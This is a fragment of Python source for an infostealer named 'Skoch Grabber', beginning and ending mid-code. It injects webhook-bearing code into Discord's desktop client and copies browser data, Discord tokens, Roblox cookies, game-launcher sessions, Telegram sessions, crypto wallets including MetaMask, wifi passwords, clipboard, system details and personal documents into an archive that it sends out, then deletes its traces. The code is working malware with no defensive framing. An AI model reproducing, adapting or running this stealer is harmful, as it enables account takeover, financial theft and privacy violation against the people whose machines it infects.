wYXRoIGQ9Ik0zLjcyIDMuNzJhLjc1Ljc1IDAgMCAxIDEuMDYgMEw4IDYuOTRsMy4yMi0zLjIyYS43NDkuNzQ5IDAgMCAxIDEuMjc1LjMyNi43NDkuNzQ5IDAgMCAxLS4yMTUuNzM0TDkuMDYgOGwzLjIyIDMuMjJhLjc0OS43NDkgMCAwIDEtLjMyNiAxLjI3NS43NDkuNzQ5IDAgMCAxLS43MzQtLjIxNUw4IDkuMDZsLTMuMjIgMy4yMmEuNzUxLjc1MSAwIDAgMS0xLjA0Mi0uMDE4Ljc1MS43NTEgMCAwIDEtLjAxOC0xLjA0Mkw2Ljk0IDggMy43MiA0Ljc4YS43NS43NSAwIDAgMSAwLTEuMDZaIj48L3BhdGg+Cjwvc3ZnPgogICAgICA8L2J1dHRvbj4KICAgICAgPGRpdiBjbGFzcz0ib2N0b2NhdC1zcGlubmVyIG15LTYganMtZGV0YWlscy1kaWFsb2ctc3Bpbm5lciI+PC9kaXY+CiAgICA8L2RldGFpbHMtZGlhbG9nPgogIDwvZGV0YWlscz4KPC90ZW1wbGF0ZT4KCiAgICA8ZGl2IGNsYXNzPSJQb3BvdmVyIGpzLWhvdmVyY2FyZC1jb250ZW50IHBvc2l0aW9uLWFic29sdXRlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgb3V0bGluZTogbm9uZTsiIHRhYmluZGV4PSIwIj4KICA8ZGl2IGNsYXNzPSJQb3BvdmVyLW1lc3NhZ2UgUG9wb3Zlci1tZXNzYWdlLS1ib3R0b20tbGVmdCBQb3BvdmVyLW1lc3NhZ2UtLWxhcmdlIEJveCBjb2xvci1zaGFkb3ctbGFyZ2UiIHN0eWxlPSJ3aWR0aDozNjBweDsiPgogIDwvZGl2Pgo8L2Rpdj4KCiAgICA8dGVtcGxhdGUgaWQ9InNuaXBwZXQtY2xpcGJvYXJkLWNvcHktYnV0dG9uIj4KICA8ZGl2IGNsYXNzPSJ6ZXJvY2xpcGJvYXJkLWNvbnRhaW5lciBwb3NpdGlvbi1hYnNvbHV0ZSByaWdodC0wIHRvcC0wIj4KICAgIDxjbGlwYm9hcmQtY29weSBhcmlhLWxhYmVsPSJDb3B5IiBjbGFzcz0iQ2xpcGJvYXJkQnV0dG9uIGJ0biBqcy1jbGlwYm9hcmQtY29weSBtLTIgcC0wIHRvb2x0aXBwZWQtbm8tZGVsYXkiIGRhdGEtY29weS1mZWVkYmFjaz0iQ29waWVkISIgZGF0YS10b29sdGlwLWRpcmVjdGlvbj0idyI+CiAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tY29weSBqcy1jbGlwYm9hcmQtY29weS1pY29uIG0tMiI+CiAgICA8cGF0aCBkPSJNMCA2Ljc1QzAgNS43ODQuNzg0IDUgMS43NSA1aDEuNWEuNzUuNzUgMCAwIDEgMCAxLjVoLTEuNWEuMjUuMjUgMCAwIDAtLjI1LjI1djcuNWMwIC4xMzguMTEyLjI1LjI1LjI1aDcuNWEuMjUuMjUgMCAwIDAgLjI1LS4yNXYtMS41YS43NS43NSAwIDAgMSAxLjUgMHYxLjVBMS43NSAxLjc1IDAgMCAxIDkuMjUgMTZoLTcuNUExLjc1IDEuNzUgMCAwIDEgMCAxNC4yNVoiPjwvcGF0aD48cGF0aCBkPSJNNSAxLjc1QzUgLjc4NCA1Ljc4NCAwIDYuNzUgMGg3LjVDMTUuMjE2IDAgMTYgLjc4NCAxNiAxLjc1djcuNUExLjc1IDEuNzUgMCAwIDEgMTQuMjUgMTFoLTcuNUExLjc1IDEuNzUgMCAwIDEgNSA5LjI1Wm0xLjc1LS4yNWEuMjUuMjUgMCAwIDAtLjI1LjI1djcuNWMwIC4xMzguMTEyLjI1LjI1LjI1aDcuNWEuMjUuMjUgMCAwIDAgLjI1LS4yNXYtNy41YS4yNS4yNSAwIDAgMC0uMjUtLjI1WiI+PC9wYXRoPgo8L3N2Zz4KICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1jaGVjayBqcy1jbGlwYm9hcmQtY2hlY2staWNvbiBjb2xvci1mZy1zdWNjZXNzIGQtbm9uZSBtLTIiPgogICAgPHBhdGggZD0iTTEzLjc4IDQuMjJhLjc1Ljc1IDAgMCAxIDAgMS4wNmwtNy4yNSA3LjI1YS43NS43NSAwIDAgMS0xLjA2IDBMMi4yMiA5LjI4YS43NTEuNzUxIDAgMCAxIC4wMTgtMS4wNDIuNzUxLjc1MSAwIDAgMSAxLjA0Mi0uMDE4TDYgMTAuOTRsNi43Mi02LjcyYS43NS43NSAwIDAgMSAxLjA2IDBaIj48L3BhdGg+Cjwvc3ZnPgogICAgPC9jbGlwYm9hcmQtY29weT4KICA8L2Rpdj4KPC90ZW1wbGF0ZT4KPHRlbXBsYXRlIGlkPSJzbmlwcGV0LWNsaXBib2FyZC1jb3B5LWJ1dHRvbi11bnBvc2l0aW9uZWQiPgogIDxkaXYgY2xhc3M9Inplcm9jbGlwYm9hcmQtY29udGFpbmVyIj4KICAgIDxjbGlwYm9hcmQtY29weSBhcmlhLWxhYmVsPSJDb3B5IiBjbGFzcz0iQ2xpcGJvYXJkQnV0dG9uIGJ0biBidG4taW52aXNpYmxlIGpzLWNsaXBib2FyZC1jb3B5IG0tMiBwLTAgdG9vbHRpcHBlZC1uby1kZWxheSBkLWZsZXggZmxleC1qdXN0aWZ5LWNlbnRlciBmbGV4LWl0ZW1zLWNlbnRlciIgZGF0YS1jb3B5LWZlZWRiYWNrPSJDb3BpZWQhIiBkYXRhLXRvb2x0aXAtZGlyZWN0aW9uPSJ3Ij4KICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1jb3B5IGpzLWNsaXBib2FyZC1jb3B5LWljb24iPgogICAgPHBhdGggZD0iTTAgNi43NUMwIDUuNzg0Ljc4NCA1IDEuNzUgNWgxLjVhLjc1Ljc1IDAgMCAxIDAgMS41aC0xLjVhLjI1LjI1IDAgMCAwLS4yNS4yNXY3LjVjMCAuMTM4LjExMi4yNS4yNS4yNWg3LjVhLjI1LjI1IDAgMCAwIC4yNS0uMjV2LTEuNWEuNzUuNzUgMCAwIDEgMS41IDB2MS41QTEuNzUgMS43NSAwIDAgMSA5LjI1IDE2aC03LjVBMS43NSAxLjc1IDAgMCAxIDAgMTQuMjVaIj48L3BhdGg+PHBhdGggZD0iTTUgMS43NUM1IC43ODQgNS43ODQgMCA2Ljc1IDBoNy41QzE1LjIxNiAwIDE2IC43ODQgMTYgMS43NXY3LjVBMS43NSAxLjc1IDAgMCAxIDE0LjI1IDExaC03LjVBMS43NSAxLjc1IDAgMCAxIDUgOS4yNVptMS43NS0uMjVhLjI1LjI1IDAgMCAwLS4yNS4yNXY3LjVjMCAuMTM4LjExMi4yNS4yNS4yNWg3LjVhLjI1LjI1IDAgMCAwIC4yNS0uMjV2LTcuNWEuMjUuMjUgMCAwIDAtLjI1LS4yNVoiPjwvcGF0aD4KPC9zdmc+CiAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tY2hlY2sganMtY2xpcGJvYXJkLWNoZWNrLWljb24gY29sb3ItZmctc3VjY2VzcyBkLW5vbmUiPgogICAgPHBhdGggZD0iTTEzLjc4IDQuMjJhLjc1Ljc1IDAgMCAxIDAgMS4wNmwtNy4yNSA3LjI1YS43NS43NSAwIDAgMS0xLjA2IDBMMi4yMiA5LjI4YS43NTEuNzUxIDAgMCAxIC4wMTgtMS4wNDIuNzUxLjc1MSAwIDAgMSAxLjA0Mi0uMDE4TDYgMTAuOTRsNi43Mi02LjcyYS43NS43NSAwIDAgMSAxLjA2IDBaIj48L3BhdGg+Cjwvc3ZnPgogICAgPC9jbGlwYm9hcmQtY29weT4KICA8L2Rpdj4KPC90ZW1wbGF0ZT4KCgoKCiAgICA8L2Rpdj4KCiAgICA8ZGl2IGlkPSJqcy1nbG9iYWwtc2NyZWVuLXJlYWRlci1ub3RpY2UiIGNsYXNzPSJzci1vbmx5IiBhcmlhLWxpdmU9InBvbGl0ZSIgPjwvZGl2PgogICAgPGRpdiBpZD0ianMtZ2xvYmFsLXNjcmVlbi1yZWFkZXItbm90aWNlLWFzc2VydGl2ZSIgY2xhc3M9InNyLW9ubHkiIGFyaWEtbGl2ZT0iYXNzZXJ0aXZlIj48L2Rpdj4KICA8L2JvZHk+CjwvaHRtbD4=').decode(errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))
        except Exception:
            return None
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding='utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

class SkochGrabber:
    Separator: str = None
    TempFolder: str = None
    ArchivePath: str = None
    Cookies: list = []
    PasswordsCount: int = 0
    HistoryCount: int = 0
    AutofillCount: int = 0
    RobloxCookiesCount: int = 0
    DiscordTokensCount: int = 0
    WifiPasswordsCount: int = 0
    MinecraftSessions: int = 0
    WebcamPicturesCount: int = 0
    TelegramSessionsCount: int = 0
    CommonFilesCount: int = 0
    WalletsCount: int = 0
    ScreenshotTaken: bool = False
    SystemInfoStolen: bool = False
    SteamStolen: bool = False
    EpicStolen: bool = False
    UplayStolen: bool = False
    GrowtopiaStolen: bool = False

    def __init__(self) -> None:
        self.Separator = '\n\n' + 'Skoch Grabber'.center(50, '=') + '\n\n'
        while True:
            self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
            if not os.path.isfile(self.ArchivePath):
                break
        Logger.info('Creating temporary folder')
        while True:
            self.TempFolder = os.path.join(os.getenv('temp'), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok=True)
                break
        for func, daemon in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealGrowtopia, False), (self.StealSteam, False), (self.StealUplay, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.BlockSites, False), (self.TakeScreenshot, True), (self.Webshot, True), (self.StealCommonFiles, True)):
            thread = Thread(target=func, daemon=daemon)
            thread.start()
            Tasks.AddTask(thread)
        Tasks.WaitForAll()
        Logger.info('All functions ended')
        if Errors.errors:
            with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                file.write('# This file contains the errors handled successfully during the functioning of the stealer.' + '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
        self.SendData()
        try:
            Logger.info('Removing archive')
            os.remove(self.ArchivePath)
            Logger.info('Removing temporary folder')
            shutil.rmtree(self.TempFolder)
        except Exception:
            pass

    @Errors.Catch
    def StealCommonFiles(self) -> None:
        if Settings.CaptureCommonFiles:
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    file: str
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)):
                            if (any([x in file.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))) and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024:
                                try:
                                    os.makedirs(os.path.join(self.TempFolder, 'Common Files', name), exist_ok=True)
                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, 'Common Files', name, file))
                                    self.CommonFilesCount += 1
                                except Exception:
                                    pass

    @Errors.Catch
    def StealMinecraft(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Minecraft related files')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Minecraft')
            userProfile = os.getenv('userprofile')
            roaming = os.getenv('appdata')
            minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'), 'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
            for name, path in minecraftPaths.items():
                if os.path.isfile(path):
                    try:
                        os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                        shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                        self.MinecraftSessions += 1
                    except Exception:
                        continue

    @Errors.Catch
    def StealGrowtopia(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Growtopia session')
            growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Growtopia')] if x is not None])]
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Growtopia')
            multiple = len(growtopiadirs) > 1
            for index, path in enumerate(growtopiadirs):
                targetFilePath = os.path.join(path, 'save.dat')
                if os.path.isfile(targetFilePath):
                    try:
                        _saveToPath = saveToPath
                        if multiple:
                            _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                        os.makedirs(_saveToPath, exist_ok=True)
                        shutil.copy(targetFilePath, os.path.join(_saveToPath, 'save.dat'))
                        self.GrowtopiaStolen = True
                    except Exception:
                        shutil.rmtree(_saveToPath)
            if multiple and self.GrowtopiaStolen:
                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                    file.write('Multiple Growtopia installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealEpic(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Epic session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
            epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if '[RememberMe]' in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                            self.EpicStolen = True
                        except Exception:
                            pass

    @Errors.Catch
    def StealSteam(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Steam session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
            steamPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Steam')] if x is not None])]
            multiple = len(steamPaths) > 1
            if not steamPaths:
                steamPaths.append('C:\\Program Files (x86)\\Steam')
            for index, steamPath in enumerate(steamPaths):
                steamConfigPath = os.path.join(steamPath, 'config')
                if os.path.isdir(steamConfigPath):
                    loginFile = os.path.join(steamConfigPath, 'loginusers.vdf')
                    if os.path.isfile(loginFile):
                        with open(loginFile) as file:
                            contents = file.read()
                        if '"RememberPassword"\t\t"1"' in contents:
                            try:
                                _saveToPath = saveToPath
                                if multiple:
                                    _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                                os.makedirs(_saveToPath, exist_ok=True)
                                shutil.copytree(steamConfigPath, os.path.join(_saveToPath, 'config'), dirs_exist_ok=True)
                                for item in os.listdir(steamPath):
                                    if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
                                        shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
                                        self.SteamStolen = True
                            except Exception:
                                pass
            if self.SteamStolen and multiple:
                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                    file.write('Multiple Steam installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealUplay(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Uplay session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
            uplayPath = os.path.join(os.getenv('localappdata'), 'Ubisoft Game Launcher')
            if os.path.isdir(uplayPath):
                for item in os.listdir(uplayPath):
                    if os.path.isfile(os.path.join(uplayPath, item)):
                        os.makedirs(saveToPath, exist_ok=True)
                        shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                        self.UplayStolen = True

    @Errors.Catch
    def StealRobloxCookies(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Roblox cookies')
            saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
            note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
            cookies = []
            browserCookies = '\n'.join(self.Cookies)
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
                cookies.append(match)
            output = list()
            for item in ('HKCU', 'HKLM'):
                process = subprocess.run('powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
                if not process.returncode:
                    output.append(process.stdout.decode(errors='ignore'))
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
                cookies.append(match)
            cookies = [*set(cookies)]
            if cookies:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
                    file.write('{}{}{}'.format(note, self.Separator, self.Separator.join(cookies)))
                self.RobloxCookiesCount += len(cookies)

    @Errors.Catch
    def StealWallets(self) -> None:
        if Settings.CaptureWallets:
            Logger.info('Stealing crypto wallets')
            saveToDir = os.path.join(self.TempFolder, 'Wallets')
            wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
            browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
            for name, path in wallets:
                if os.path.isdir(path):
                    _saveToDir = os.path.join(saveToDir, name)
                    os.makedirs(_saveToDir, exist_ok=True)
                    try:
                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                        with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                            file.write(path)
                        self.WalletsCount += 1
                    except Exception:
                        try:
                            shutil.rmtree(_saveToDir)
                        except Exception:
                            pass
            for name, path in browserPaths.items():
                if os.path.isdir(path):
                    for root, dirs, _ in os.walk(path):
                        for _dir in dirs:
                            if _dir == 'Local Extension Settings':
                                localExtensionsSettingsDir = os.path.join(root, _dir)
                                for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                    extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
                                    if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                        try:
                                            metamask_browser = os.path.join(saveToDir, 'Metamask ({})'.format(name))
                                            _saveToDir = os.path.join(metamask_browser, _dir)
                                            shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok=True)
                                            with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                                file.write(extentionPath)
                                            self.WalletsCount += 1
                                        except Exception:
                                            try:
                                                shutil.rmtree(_saveToDir)
                                                if not os.listdir(metamask_browser):
                                                    shutil.rmtree(metamask_browser)
                                            except Exception:
                                                pass

    @Errors.Catch
    def StealSystemInfo(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Stealing system information')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('systeminfo', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
                    file.write(output)
                self.SystemInfoStolen = True
            process = subprocess.run('getmac', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'MAC Addresses.txt'), 'w') as file:
                    file.write(output)
                self.SystemInfoStolen = True

    @Errors.Catch
    def GetDirectoryTree(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting directory trees')
            PIPE = chr(9474) + '   '
            TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
            ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
            output = {}
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    dircontent: list = os.listdir(dir)
                    if 'desltop.ini' in dircontent:
                        dircontent.remove('desktop.ini')
                    if dircontent:
                        process = subprocess.run('tree /A /F', shell=True, capture_output=True, cwd=dir)
                        if process.returncode == 0:
                            output[name] = (name + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
            for key, value in output.items():
                os.makedirs(os.path.join(self.TempFolder, 'Directories'), exist_ok=True)
                with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
                    file.write(value)
                self.SystemInfoStolen = True

    @Errors.Catch
    def GetClipboard(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting clipboard text')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('powershell Get-Clipboard', shell=True, capture_output=True)
            if process.returncode == 0:
                content = process.stdout.decode(errors='ignore').strip()
                if content:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
                        file.write(content)

    @Errors.Catch
    def GetAntivirus(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting antivirus')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n').splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write('\n'.join(output))

    @Errors.Catch
    def GetTaskList(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting task list')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('tasklist /FO LIST', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
                    tasklist.write(output)

    @Errors.Catch
    def GetWifiPasswords(self) -> None:
        if Settings.CaptureWifiPasswords:
            Logger.info('Getting wifi passwords')
            saveToDir = os.path.join(self.TempFolder, 'System')
            passwords = Utility.GetWifiPasswords()
            profiles = list()
            for profile, psw in passwords.items():
                profiles.append(f'Network: {profile}\nPassword: {psw}')
            if profiles:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(profiles))
                self.WifiPasswordsCount += len(profiles)

    @Errors.Catch
    def TakeScreenshot(self) -> None:
        if Settings.CaptureScreenshot:
            Logger.info('Taking screenshot')
